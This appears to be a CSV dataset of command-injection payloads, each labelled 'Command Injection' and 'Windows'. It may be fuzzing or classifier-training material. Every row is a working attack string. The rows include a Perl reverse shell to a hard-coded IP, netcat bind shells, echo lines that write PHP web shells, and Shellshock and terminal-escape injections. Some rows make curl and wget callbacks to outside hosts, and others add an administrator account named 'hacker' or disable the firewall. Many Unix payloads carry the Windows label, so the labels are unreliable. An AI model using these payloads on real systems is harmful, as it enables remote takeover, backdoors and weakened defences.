value,label,description
a|id|,Command Injection,Windows
a;id|,Command Injection,Windows
a;id;,Command Injection,Windows
a;id\n,Command Injection,Windows
() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,Command Injection,Windows
| curl http://crowdshield.com/.testing/rce.txt,Command Injection,Windows
& curl http://crowdshield.com/.testing/rce.txt,Command Injection,Windows
; curl https://crowdshield.com/.testing/rce_vuln.txt,Command Injection,Windows
&& curl https://crowdshield.com/.testing/rce_vuln.txt,Command Injection,Windows
curl https://crowdshield.com/.testing/rce_vuln.txt,Command Injection,Windows
" curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",Command Injection,Windows
"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",Command Injection,Windows
$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),Command Injection,Windows
dir,Command Injection,Windows
| dir,Command Injection,Windows
; dir,Command Injection,Windows
$(`dir`),Command Injection,Windows
& dir,Command Injection,Windows
&&dir,Command Injection,Windows
&& dir,Command Injection,Windows
| dir C:\,Command Injection,Windows
; dir C:\,Command Injection,Windows
& dir C:\,Command Injection,Windows
&& dir C:\,Command Injection,Windows
dir C:\,Command Injection,Windows
| dir C:\Documents and Settings\*,Command Injection,Windows
; dir C:\Documents and Settings\*,Command Injection,Windows
& dir C:\Documents and Settings\*,Command Injection,Windows
&& dir C:\Documents and Settings\*,Command Injection,Windows
dir C:\Documents and Settings\*,Command Injection,Windows
| dir C:\Users,Command Injection,Windows
; dir C:\Users,Command Injection,Windows
& dir C:\Users,Command Injection,Windows
&& dir C:\Users,Command Injection,Windows
dir C:\Users,Command Injection,Windows
;echo%20'<script>alert(1)</script>',Command Injection,Windows
echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,Command Injection,Windows
"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",Command Injection,Windows
"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",Command Injection,Windows
"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",Command Injection,Windows
"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",Command Injection,Windows
"echo ""<?php include($_GET['page']); ?>"" > rfi.php",Command Injection,Windows
"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php ",Command Injection,Windows
"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",Command Injection,Windows
"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",Command Injection,Windows
"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",Command Injection,Windows
"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",Command Injection,Windows
"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",Command Injection,Windows
"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",Command Injection,Windows
"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",Command Injection,Windows
"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",Command Injection,Windows
"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",Command Injection,Windows
;echo '<script>alert(1)</script>',Command Injection,Windows
echo '<script>alert(1)</script>'// XXXXXXXXXXX,Command Injection,Windows
echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,Command Injection,Windows
"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",Command Injection,Windows
"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",Command Injection,Windows
"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",Command Injection,Windows
"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",Command Injection,Windows
"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",Command Injection,Windows
() { :;}; echo vulnerable 10,Command Injection,Windows
eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),Command Injection,Windows
eval('ls'),Command Injection,Windows
eval('pwd'),Command Injection,Windows
eval('pwd');,Command Injection,Windows
eval('sleep 5'),Command Injection,Windows
eval('sleep 5');,Command Injection,Windows
eval('whoami'),Command Injection,Windows
eval('whoami');,Command Injection,Windows
exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),Command Injection,Windows
exec('ls'),Command Injection,Windows
exec('pwd'),Command Injection,Windows
exec('pwd');,Command Injection,Windows
exec('sleep 5'),Command Injection,Windows
exec('sleep 5');,Command Injection,Windows
exec('whoami'),Command Injection,Windows
exec('whoami');,Command Injection,Windows
";{$_GET[""cmd""]}",Command Injection,Windows
`id`,Command Injection,Windows
|id,Command Injection,Windows
| id,Command Injection,Windows
;id,Command Injection,Windows
;id|,Command Injection,Windows
;id;,Command Injection,Windows
& id,Command Injection,Windows
&&id,Command Injection,Windows
;id\n,Command Injection,Windows
ifconfig,Command Injection,Windows
| ifconfig,Command Injection,Windows
; ifconfig,Command Injection,Windows
& ifconfig,Command Injection,Windows
&& ifconfig,Command Injection,Windows
/index.html|id|,Command Injection,Windows
ipconfig,Command Injection,Windows
| ipconfig /all,Command Injection,Windows
; ipconfig /all,Command Injection,Windows
& ipconfig /all,Command Injection,Windows
&& ipconfig /all,Command Injection,Windows
ipconfig /all,Command Injection,Windows
ls,Command Injection,Windows
$(`ls`),Command Injection,Windows
| ls -l /,Command Injection,Windows
; ls -l /,Command Injection,Windows
& ls -l /,Command Injection,Windows
&& ls -l /,Command Injection,Windows
ls -l /,Command Injection,Windows
| ls -laR /etc,Command Injection,Windows
; ls -laR /etc,Command Injection,Windows
& ls -laR /etc,Command Injection,Windows
&& ls -laR /etc,Command Injection,Windows
| ls -laR /var/www,Command Injection,Windows
; ls -laR /var/www,Command Injection,Windows
& ls -laR /var/www,Command Injection,Windows
&& ls -laR /var/www,Command Injection,Windows
| ls -l /etc/,Command Injection,Windows
; ls -l /etc/,Command Injection,Windows
& ls -l /etc/,Command Injection,Windows
&& ls -l /etc/,Command Injection,Windows
ls -l /etc/,Command Injection,Windows
ls -lh /etc/,Command Injection,Windows
| ls -l /home/*,Command Injection,Windows
; ls -l /home/*,Command Injection,Windows
& ls -l /home/*,Command Injection,Windows
&& ls -l /home/*,Command Injection,Windows
ls -l /home/*,Command Injection,Windows
*; ls -lhtR /var/www/,Command Injection,Windows
| ls -l /tmp,Command Injection,Windows
; ls -l /tmp,Command Injection,Windows
& ls -l /tmp,Command Injection,Windows
&& ls -l /tmp,Command Injection,Windows
ls -l /tmp,Command Injection,Windows
| ls -l /var/www/*,Command Injection,Windows
; ls -l /var/www/*,Command Injection,Windows
& ls -l /var/www/*,Command Injection,Windows
&& ls -l /var/www/*,Command Injection,Windows
ls -l /var/www/*,Command Injection,Windows
\n,Command Injection,Windows
\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,Command Injection,Windows
\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,Command Injection,Windows
\n/bin/ls -al\n,Command Injection,Windows
| nc -lvvp 4444 -e /bin/sh|,Command Injection,Windows
; nc -lvvp 4444 -e /bin/sh;,Command Injection,Windows
& nc -lvvp 4444 -e /bin/sh&,Command Injection,Windows
&& nc -lvvp 4444 -e /bin/sh &,Command Injection,Windows
nc -lvvp 4444 -e /bin/sh,Command Injection,Windows
nc -lvvp 4445 -e /bin/sh &,Command Injection,Windows
nc -lvvp 4446 -e /bin/sh|,Command Injection,Windows
nc -lvvp 4447 -e /bin/sh;,Command Injection,Windows
nc -lvvp 4448 -e /bin/sh&,Command Injection,Windows
\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,Command Injection,Windows
\necho INJECTX\nexit\n\033[2Asleep 5\n,Command Injection,Windows
\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,Command Injection,Windows
| net localgroup Administrators hacker /ADD,Command Injection,Windows
; net localgroup Administrators hacker /ADD,Command Injection,Windows
& net localgroup Administrators hacker /ADD,Command Injection,Windows
&& net localgroup Administrators hacker /ADD,Command Injection,Windows
net localgroup Administrators hacker /ADD,Command Injection,Windows
| netsh firewall set opmode disable,Command Injection,Windows
; netsh firewall set opmode disable,Command Injection,Windows
& netsh firewall set opmode disable,Command Injection,Windows
&& netsh firewall set opmode disable,Command Injection,Windows
netsh firewall set opmode disable,Command Injection,Windows
netstat,Command Injection,Windows
;netstat -a;,Command Injection,Windows
| netstat -an,Command Injection,Windows
; netstat -an,Command Injection,Windows
& netstat -an,Command Injection,Windows
&& netstat -an,Command Injection,Windows
netstat -an,Command Injection,Windows
| net user hacker Password1 /ADD,Command Injection,Windows
; net user hacker Password1 /ADD,Command Injection,Windows
& net user hacker Password1 /ADD,Command Injection,Windows
&& net user hacker Password1 /ADD,Command Injection,Windows
net user hacker Password1 /ADD,Command Injection,Windows
| net view,Command Injection,Windows
; net view,Command Injection,Windows
& net view,Command Injection,Windows
&& net view,Command Injection,Windows
net view,Command Injection,Windows
\nid|,Command Injection,Windows
\nid;,Command Injection,Windows
\nid\n,Command Injection,Windows
\n/usr/bin/id\n,Command Injection,Windows
"perl -e 'print ""X""x1024'",Command Injection,Windows
"|| perl -e 'print ""X""x16096'",Command Injection,Windows
"| perl -e 'print ""X""x16096'",Command Injection,Windows
"; perl -e 'print ""X""x16096'",Command Injection,Windows
"& perl -e 'print ""X""x16096'",Command Injection,Windows
"&& perl -e 'print ""X""x16096'",Command Injection,Windows
"perl -e 'print ""X""x16384'",Command Injection,Windows
"; perl -e 'print ""X""x2048'",Command Injection,Windows
"& perl -e 'print ""X""x2048'",Command Injection,Windows
"&& perl -e 'print ""X""x2048'",Command Injection,Windows
"perl -e 'print ""X""x2048'",Command Injection,Windows
"|| perl -e 'print ""X""x4096'",Command Injection,Windows
"| perl -e 'print ""X""x4096'",Command Injection,Windows
"; perl -e 'print ""X""x4096'",Command Injection,Windows
"& perl -e 'print ""X""x4096'",Command Injection,Windows
"&& perl -e 'print ""X""x4096'",Command Injection,Windows
"perl -e 'print ""X""x4096'",Command Injection,Windows
"|| perl -e 'print ""X""x8096'",Command Injection,Windows
"| perl -e 'print ""X""x8096'",Command Injection,Windows
"; perl -e 'print ""X""x8096'",Command Injection,Windows
"&& perl -e 'print ""X""x8096'",Command Injection,Windows
"perl -e 'print ""X""x8192'",Command Injection,Windows
"perl -e 'print ""X""x81920'",Command Injection,Windows
|| phpinfo(),Command Injection,Windows
| phpinfo(),Command Injection,Windows
 {${phpinfo()}},Command Injection,Windows
;phpinfo(),Command Injection,Windows
;phpinfo();//,Command Injection,Windows
';phpinfo();//,Command Injection,Windows
{${phpinfo()}},Command Injection,Windows
& phpinfo(),Command Injection,Windows
&& phpinfo(),Command Injection,Windows
phpinfo(),Command Injection,Windows
phpinfo();,Command Injection,Windows
"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",Command Injection,Windows
"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",Command Injection,Windows
